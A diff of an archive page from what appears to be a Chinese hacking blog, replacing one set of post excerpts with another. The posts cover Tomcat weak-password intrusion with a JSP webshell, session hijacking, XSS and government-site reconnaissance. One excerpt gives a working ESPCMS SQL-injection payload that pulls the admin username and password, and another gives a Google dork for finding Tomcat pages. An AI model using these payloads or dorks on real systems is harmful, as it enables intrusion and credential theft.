@@ -45,27 +45,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-04-14T16:08:56.000Z" itemprop="datePublished">
-          2012-04-15
+      <time datetime="2013-05-19T18:24:09.000Z" itemprop="datePublished">
+          2013-05-20
       </time>
     
     
     | 
-    <a href='/tag/FTP/'>FTP</a>
+    <a href='/tag/Tomcat/'>Tomcat</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/388.seo/">通过注册表读ftp路径</a></h2>
+      <h2 class="post-title"><a href="/997.seo/">渗透Linux服务器过程中，临时社工进行openfire解密</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        这个漏洞貌似鸡肋，但是也有强大的用处。但是懂得怎么利用他，完全靠得自己，我只是给一个小小思路。进入主题！  重要注册表：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\ControlSet002这个目录可以是ControlSet001 ControlSet003注明：不是用第三方软件分配出来的ftp用户，一定要是基于ii
+        <p>首先要有切入点，那就是<a href="http://Ha.Cker.In/tag/Tomcat" target="_blank">Tomcat</a>/manager/html的管理员页面弱口令。    <br />顺便科普一下，大家可以利用google hack来寻找tomcat页面    <br />在浏览器中输入：intitle:Apache.Tomcat &quot;Congratulations!&quot;&#160;&#160; <br />大概意思是：用点号来分割title关键词，用冒号来匹配页面内容</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0026.jpg"><img title="clip_image002[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="394" alt="clip_image002[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0026_thumb.jpg" width="620" border="0" /></a></p>  <p>当然如果/manager/html页面被删，或者管理员没有配置账号密码为可用，管理界面就不能访问。   <br />上传Deploy一个JSP大马:</p><br>
       
       </p>
       
       <p>
-          <a href="/388.seo/" class="excerpt-link">Read More...</a>
+          <a href="/997.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -74,29 +74,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-04-14T15:47:28.000Z" itemprop="datePublished">
-          2012-04-14
+      <time datetime="2013-05-14T00:13:05.000Z" itemprop="datePublished">
+          2013-05-14
       </time>
     
     
     | 
-    <a href='/tag/Discuz-X2-5/'>Discuz!X2.5</a>,
-    
-    <a href='/tag/Discuz-X2升级/'>Discuz!X2升级</a>
+    <a href='/tag/Session劫持/'>Session劫持</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/386.seo/">完美Discuz!X2 utf8升级为Discuz!X2.5 GBK记录</a></h2>
+      <h2 class="post-title"><a href="/995.seo/">PHP漏洞之session会话劫持</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><strong>首先说明：</strong>  <p>1、该教程不考虑插件问题，插件必须重新卸载再安装相应编码  <p>2、使用前最好先全站备份，这样出了问题也好恢复  <p>因为原论坛安装的是Discuz!X2 UTF8比较占用空间，而且官方正好有发布了Discuz!X2.5正式版，因此就想转成直接升级为Discuz!X2.5 GBK版。  <p>经过多次摸索并参考相关转换教程，终于找到这种转换方式的方法，实现完美转换了，下面给大家分享此经验。  <p><strong>具体教程如下：</strong>  <p>一、首先将Discuz!X2 UTF8转换为Discuz!X2 GBK  <p>1、备份已修改文件：  <p>这个主要是图片的修改，一般来说，备份以下文件即可：  <p>1.1、static/image/common/logo.png  <p>1.2、static/image/common/logo_sc.png  <p>1.3、static/image/common/logo_88_31.gif  <p>1.4、static/image/mobile/logo.gif  <p>1.5、favicon.ico  <p>1.6、.htaccess  <p>2、安装TOOLS：  <p>下载<a href="http://www.discuz.net/thread-2659440-1-1.html">Tools 1.9M for Discuz!X</a>，然后按照官方教程安装并使用。  <p>3、利用TOOLS进行转码：  <p>首先把论坛关闭，避免转换过程中影响会员使用；  <p>然后再进行转码，点击模块化那个大大的TOOLS，然后点击左边栏的：编码转换（如下图所示）  <p>然后点提交，等待转换完成，接下来就是最重要的修改部分了。  <p>4、修改并用新的GBK编码程序文件上传覆盖原UTF8文件：  <p>4.1、首先从官方下载最新的Discuz!X2 GBK<a href="http://download.comsenz.com/DiscuzX/2.0/Discuz_X2_SC_GBK.zip，并解压到默认的Discuz_X2_SC_GBK文件夹；">http://download.comsenz.com/DiscuzX/2.0/Discuz_X2_SC_GBK.zip，并解压到默认的Discuz_X2_SC_GBK文件夹；</a>  <p>4.2、接着把论坛中原UTF8版的三个文件下载并覆盖到对应的解压好Discuz_X2_SC_GBK文件夹中，如下图所示： </p>
+        <p>本文主要介绍针对PHP网站<a href="http://Ha.Cker.In/tag/Session劫持" target="_blank">Session劫持</a>。session劫持是一种比较复杂的攻击方法。大部分互联网上的电脑多存在被攻击的危险。这是一种劫持tcp协议的方法，所以几乎所有的局域网，都存在被劫持可能。</p>  <p>服务端和客户端之间是通过session(会话)来连接沟通。当客户端的浏览器连接到服务器后，服务器就会建立一个该用户的session。每个用 户的session都是独立的，并且由服务器来维护。每个用户的session是由一个独特的字符串来识别，成为session id。用户发出请求时，所发送的http表头内包含session id 的值。服务器使用http表头内的session id来识别时哪个用户提交的请求。</p>  <p>session保存的是每个用户的个人数据，一般的web应用程序会使用session来保存通过验证的用户账号和密码。在转换不同的网页时，如果 需要验证用户身份，就是用session内所保存的账号和密码来比较。session的生命周期从用户连上服务器后开始，在用户关掉浏览器或是注销时用户 session_destroy函数删除session数据时结束。如果用户在20分钟内没有使用计算机的动作，session也会自动结束。</p>  <p>php处理session的应用架构    <br /><img title="clip_image001[4]" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="466" alt="clip_image001[4]" src="http://ha.cker.in/usr/uploads/2013/05/3858525608.jpg" width="389" border="0" /></p>  <p>会话劫持</p>  <p>会话劫持是指攻击者利用各种手段来获取目标用户的session id。一旦获取到session id，那么攻击者可以利用目标用户的身份来登录网站，获取目标用户的操作权限。</p>  <p>攻击者获取目标用户session id的方法:    <br />1）暴力破解:尝试各种session id，直到破解为止。     <br />2）计算:如果session id使用非随机的方式产生，那么就有可能计算出来     <br />3）窃取:使用网络截获，xss攻击等方法获得</p>  <p>会话劫持的攻击步骤</p>  <p><img title="" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; margin-left: 0px; margin-right: 0px; border-right-width: 0px" height="354" alt="" src="http://ha.cker.in/usr/uploads/2013/05/857104028.jpg" width="396" border="0" /></p><br>
       
       </p>
       
       <p>
-          <a href="/386.seo/" class="excerpt-link">Read More...</a>
+          <a href="/995.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -105,27 +103,81 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-04-10T00:15:21.000Z" itemprop="datePublished">
-          2012-04-10
+      <time datetime="2013-04-11T08:41:59.000Z" itemprop="datePublished">
+          2013-04-11
       </time>
     
     
     | 
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/Espcms/'>Espcms</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/989.seo/">易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><a href="http://ha.cker.in/tag/Espcms" target="_blank">Espcms</a> <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a><a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a> 第二弹     <br /><a href="http://team.f4ck.net/thread-10337-1-1.html">http://team.f4ck.net/thread-10337-1-1.html</a></p>  <p>   <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统基于LAMP开发构建的企业网站管理系统。     <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统V5.6.13.04.03的会员中心模块存在<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>漏洞文件: interface/membermain.php    <br /></p>  <pre>function in_save() {<br>                parent::start_pagetemplate();<br>                parent::member_purview();<br>                $lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br>                $inputclass = $this-&gt;fun-&gt;accept(‘inputclass’, ‘R’);<br>                $upurl = $this-&gt;fun-&gt;accept(‘upurl’, ‘R’);<br>                $userid = intval($this-&gt;fun-&gt;accept(‘userid’, ‘P’));<br>                $username = $this-&gt;fun-&gt;accept(‘username’, ‘P’);<br>                if (empty($userid) || empty($username)) {<br>                        $linkURL = $this-&gt;mlink[‘center’];<br>                        $this-&gt;callmessage($this-&gt;lng[‘member_edit_ok’], $linkURL, $this-&gt;lng[‘gobackurlbotton’]);<br>                }<br>                $email = trim($this-&gt;fun-&gt;accept(‘email’, ‘P’));<br>                $question = trim($this-&gt;fun-&gt;accept(‘question’, ‘P’, true, true));<br>                $answer = trim($this-&gt;fun-&gt;accept(‘answer’, ‘P’, true, true));<br>                $alias = trim($this-&gt;fun-&gt;accept(‘alias’, ‘P’, true, true));//通过一个accept函数,确定为post提交<br>                $sex = $this-&gt;fun-&gt;accept(‘sex’, ‘P’);//注得就是你了.$sex可控,<br>                $sex = empty($sex) ? 0 : $sex;<br>                $tel = trim($this-&gt;fun-&gt;accept(‘tel’, ‘P’, true, true));<br>                $mobile = trim($this-&gt;fun-&gt;accept(‘mobile’, ‘P’, true, true));<br>                $birthday = $this-&gt;fun-&gt;accept(‘birthday’, ‘P’);<br>                $birthday = empty($birthday) ? 0 : $this-&gt;fun-&gt;formatdate($birthday, 4);<br>                $country = intval($this-&gt;fun-&gt;accept(‘cityone’, ‘P’));<br>                $country = empty($country) ? 0 : $country;<br>                $province = intval($this-&gt;fun-&gt;accept(‘citytwo’, ‘P’));<br>                $province = empty($province) ? 0 : $province;<br>                $city = intval($this-&gt;fun-&gt;accept(‘citythree’, ‘P’));<br>                $city = empty($city) ? 0 : $city;<br>                $district = intval($this-&gt;fun-&gt;accept(‘district’, ‘P’));<br>                $district = empty($district) ? 0 : $district;<br>                $address = trim($this-&gt;fun-&gt;accept(‘address’, ‘P’, true, true));<br>                $zipcode = trim($this-&gt;fun-&gt;accept(‘zipcode’, ‘P’, true, true));<br>                $zipcode = empty($zipcode) ? 0 : $zipcode;<br>                $msn = trim($this-&gt;fun-&gt;accept(‘msn’, ‘P’, true, true));<br>                $qq = $this-&gt;fun-&gt;accept(‘qq’, ‘P’);<br>                $qq = empty($qq) ? 0 : $qq;<br><br>                $db_table = db_prefix . ‘member’;<br>                $db_table2 = db_prefix . ‘member_value’;</pre><br><br><p>下面来看看怎么进行入库处理的吧。<br>  <br />$db_where = ‘userid=’ . $userid;<br><br>  <br />$db_set= &quot;sex=$sex,birthday=$birthday,country=$country,province=$province,city=$city,district=$district,alias=’$alias’,address=’$address’,zipcode=$zipcode,tel=’$tel’,mobile=’$mobile’,qq=$qq,msn=’$msn’&quot;;<br><br>  <br />$this-&gt;db-&gt;query(‘UPDATE ‘ . $db_table . ‘ SET ‘ . $db_set . ‘ WHERE ‘ . $db_where);</p>
+
+<p>Update注入,看了下数据库,address为varchar。</p>
+
+<p>因为这个cms有个防报错的函数,构造遇到了点麻烦,一出错就显示Can not connect to Mysql server,<br>  <br />&#160;</p>
+
+<p>追踪下此函数:<br>  <br /></p>
+
+<pre>function halt($message = '', $sql = '') { 
+                $db_err = !db_err ? 0 : db_err; 
+                $db_sql = !db_sql ? 0 : db_sql; 
+                $mysqlinfo = '&lt;font size=&quot;2&quot;&gt;&lt;b&gt;ESPCMS SQL Error:&lt;/b&gt; Can not connect to MySQL server&lt;b&gt;Time:&lt;/b&gt;' . date('e Y-m-d H-i-s', time()); 
+                $mysqlinfo.= $db_sql ? '&lt;b&gt;SQL:&lt;/b&gt;' . $sql : ''; 
+                $mysqlinfo.= $db_err ? '&lt;b&gt;Error：&lt;/b&gt;' . mysql_error() : ''; 
+                $mysqlinfo.= '&lt;a target=&quot;_blank&quot; href=&quot;http://www.espcms.com&quot;&gt;http://www.espcms.com&lt;/a&gt; Access Query Errors&lt;/font&gt;'; 
+
+                exit($mysqlinfo); 
+        }</pre>
+
+<p>为了方便构造, 把出错的sql语句和出错的提示都打印出来。<br>  <br />sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,CHAR(0x7c),password) from espcms_admin_member limit 1),zipcode=0,tel=0,mobile=0,qq=0,msn=0/<em>&amp;birthday=2013-04-02&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=12&amp;zipcode=0&amp;tel=&amp;mobile=&amp;msn=&amp;qq=</em>/</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/989.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-03-07T18:28:42.000Z" itemprop="datePublished">
+          2013-03-08
+      </time>
+    
+    
+    | 
+    <a href='/tag/xss/'>xss</a>,
+    
     <a href='/tag/cookie欺骗/'>cookie欺骗</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/367.seo/">聚商宝2.0暴库及cookies欺骗缺陷及修复</a></h2>
+      <h2 class="post-title"><a href="/977.seo/">淘宝站内信xss直接实现定向攻击</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        程序：聚商宝2.0　　google关键字：intext:技术支持：奔明科技 聚商宝　　前几天遇到了个程序叫聚商宝，把源码下载过来了，今天才有时间简单的看了看……　　漏洞：暴库以及后台cookies欺骗　　1）直接访问conn/conn.asp 暴出数据库地址，下载，解密，登录后台　　2）cookies欺骗，admin文件夹下check.asp文件中的代码片段：　　dim uid,upwd www.**.com　　uid=Replace_
+        简要描述：  淘宝站内信xss，再研究下去可能获取cookie    希望各xss大牛研究下利用方式，这下子如果利用出去了 损失你懂的  详细说明：  &lt;iframe src=*&gt;直接插，script好像不行，embed也直接上了   就算不能获取cookie欺骗点击，给非法网络营销做贡献咯~   漏洞证明：    修复方案：  不说了 站内信居然有这样的问题。
       
       </p>
       
       <p>
-          <a href="/367.seo/" class="excerpt-link">Read More...</a>
+          <a href="/977.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -134,29 +186,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-04-09T20:07:14.000Z" itemprop="datePublished">
-          2012-04-10
+      <time datetime="2013-01-21T23:26:11.000Z" itemprop="datePublished">
+          2013-01-22
       </time>
     
     
     | 
-    <a href='/tag/Discuz/'>Discuz</a>,
+    <a href='/tag/Anonymous/'>Anonymous</a>,
     
-    <a href='/tag/Get-Shell/'>Get Shell</a>
+    <a href='/tag/匿名者/'>匿名者</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/365.seo/">discuz! X1.0 &ndash; X1.5 Blind SQL injection exploit & Get Shell</a></h2>
+      <h2 class="post-title"><a href="/970.seo/">黑客组织Anonymous疯狂入侵中国站点思路分析</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        ################################################### Exploit Title: [discuz! X1.0 - X1.5 Blind SQL injection exploit &amp; Get Shell]# Date: [06-04-2012]# Author: [Hacker-Fire]# Category:: [ webapps]# Google dork: [Powere
+        <p>关于<a href="http://ha.cker.in/tag/匿名者" target="_blank">匿名者</a>组织的疯狂拿站和统一黑页显示时间的行为，相信大家已经见怪不怪了，但是当匿名者组织开始侵略中国网站的时候，相信大家都坐不住了。首先，个人感觉反击的意义何在，或者说究竟有没有意义，笔者不是哲学家，思想家，不做过多探讨。但是，知己知彼确实是必要的。笔者对前一段时间，国内地方GOV被疯狂秒杀的一次行动做了一次没什么技术含量的分析和猜想。</p>  <p>（以下敏感域名用WWW.XXX.COM略过）</p>  <p>首先，笔者登陆了FACEBOOK找寻了一些热议的话题：</p>  <p>（以下为GOOGLE翻译，英文不好，只好找谷大哥帮忙）</p>  <p>1.中国3000+政务工作网站 匿名者成功获取权限</p>  <p>2.匿名者再次攻击亚洲各国，宣传独立自由 在网络中</p>  <p>3.亚洲强国网络安全成为匿名者的击打目标。</p>  <p>以上是通过匿名者为关键字模糊搜索的热议转载，基本每个热议都指向匿名者发布新闻和预告信的推特，笔者只好继续翻阅防火长城登陆推特，观看了一些匿名者发布针对亚洲和其他洲的攻击成果发布，评论中充斥着各种赞扬与羡慕，当然不乏我国人士（最大的悲剧），当然，也有进行技术分析的人，有一条评论中带有这样一个域名：</p>  <p>www.xxseo.com（化名）</p>  <p>接着，笔者C段了一下：</p>  <p>IP：</p>  <p>XXX.XXX.XXX.200</p>  <p>XXX.XXX.XXX.201</p>  <p>XXX.XXX.XXX.202</p>  <p>XXX.XXX.XXX.203</p>  <p>XXX.XXX.XXX.204</p>  <p>XXX.XXX.XXX.205</p>  <p>``````````````````````````````</p>  <p>以上IP全部指向中国某省级机房</p>  <p>OK，就这个IP段开始旁站扫描，得到无数四级域名：</p>  <p>XXX.host1068.xxxseo.com.cn</p>  <p>XXX.host1079.xxxseo.com.cn</p>  <p>XXX.host1081.xxxseo.com.cn</p>  <p>XXX.host1083.xxxseo.com.cn</p>  <p>XXX.host1093.xxxseo.com.cn</p>  <p>XXX.host1099.xxxseo.com.cn</p>  <p>·····························</p>  <p>相信看到这里，大家应该明白了些什么，当然笔者还是打开验证了下</p>  <p>无一例外，全部是政务网站，各地GOV。</p>  <p>XXX.host1099.xxxseo.com.cn</p>  <p>都是IDC机房托管的分配四级域名，实际绑定是WWW.XXX.GOV.CN</p>  <p>笔者继续扫描旁站，并导出所有URL（四级域名）</p>  <p>将导出的列表批量经行绑定域名反查，得到实际绑定域名结果列表。</p>  <p>在工具经行这些自动化扫描导出的时候，笔者继续做着准备，将匿名者在推特发布的攻击我国站点的列表下载了一份，可以不是文本，图片质量又狂差，只能美图秀秀去个雾（不会PS的伤不起），勉强看清了URL。</p>  <p>准备工作做完，手上有两份列表，一份是扫描旁站得出的IDC C段的GOV站点 URL列表。另一份是匿名者发布的攻击我国站点公开列表。</p>  <p>然后笔者比对了一下，相信结果大家都猜到了。</p>  <p>IDC下的163个GOV站点，有112个在匿名者攻击列表中，当然匿名者公布了3000+个。</p>  <p>好的，对匿名者每次行动的印象让我立即从庞大组织的集体攻击，变成了组织性的批量拿站。</p>  <p>这个时候，笔者又有了另一个猜想，即使是批量攻击，整个C段也是要花时间的，于是笔者爬行了5个网站的目录，BINGO，全中，居然是一模一样的目录结构，好的，原来是一个公司的业务啊！统一的建站系统，统一的OA系统，统一的邮件系统，统一的VPN登陆远程办公系统，好吧，你赢了！</p>  <p><a href="http://img.cker.in/Anonymous_D8D1/clip_image001.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Anonymous_D8D1/clip_image001_thumb.jpg" width="504" height="344" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/365.seo/" class="excerpt-link">Read More...</a>
+          <a href="/970.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -165,60 +217,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-04-09T20:05:19.000Z" itemprop="datePublished">
-          2012-04-10
+      <time datetime="2012-12-30T00:54:50.000Z" itemprop="datePublished">
+          2012-12-30
       </time>
     
-    
-    | 
-    <a href='/tag/Webshell/'>Webshell</a>,
-    
-    <a href='/tag/0day/'>0day</a>,
-    
-    <a href='/tag/SiteEngine/'>SiteEngine</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/363.seo/">SiteEngine 7.1 会员上传WEBSHELL漏洞0DAY</a></h2>
+      <h2 class="post-title"><a href="/962.seo/">代码审计：ECShop V2.7.3 GBK release1106注入0day及修复</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        作者:hackdn 转载注明 zend编码解密的不完整，也懒得看代码了，用Tamper之类的插件测试的POST参数，反正就是$sFile = $oFile[‘name’];的过滤太傻瓜了，貌似 第5版本之后就修改了函数了。。这次是会员发站内短信上传附件的漏洞，问题出在pms.php上，具体代码分析懒得啰嗦了，POC就不放了，都懂的。 直接说方法： 1： register.php注册账号 2：打开pms.php?action=send&a
+        C0deplay Team&#160;&#160;&#160; j8g   看代码  / 修改个人资料的处理 /elseif ($action == ‘act_edit_profile’){    include_once(ROOT_PATH . ‘includes/lib_transaction.php’);    $birthday = trim($_POST[‘birthdayYear’]) .’-’. trim($_POST[‘
       
       </p>
       
       <p>
-          <a href="/363.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-04-09T10:58:24.000Z" itemprop="datePublished">
-          2012-04-09
-      </time>
-    
-    
-    | 
-    <a href='/tag/ThinkPHP/'>ThinkPHP</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/357.seo/">ThinkPHP framework 任意代码执行漏洞预警</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        ThinkPHP是一个国内使用很广泛的老牌PHP MVC框架。貌似国内有不少创业公司或者项目都用了这个框架。最近官方发布了一个安全补丁，官方表述是：该URL安全漏洞会造成用户在客户端伪造URL，执行非法代码。可是貌似大多数开发者和使用者并没有注意到此漏洞的危害性，应者了了，更不用说有多少人去升级了。随后我对其进行了分析，发现此问题果然是一个非常严重的问题，只要使用了thinkphp框架，就可以直接执行任意php代码。特此发帖预警各位。我
-      
-      </p>
-      
-      <p>
-          <a href="/357.seo/" class="excerpt-link">Read More...</a>
+          <a href="/962.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -226,7 +240,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/category/Web安全/page/5/">← Newer Posts</a>
-    <span class="page-number">Page 6 of 8</span>
+    <span class="page-number">Page 6 of 15</span>
     <a class="older-posts" href="/category/Web安全/page/7/">Older Posts →</a>
   </nav>
 </main>
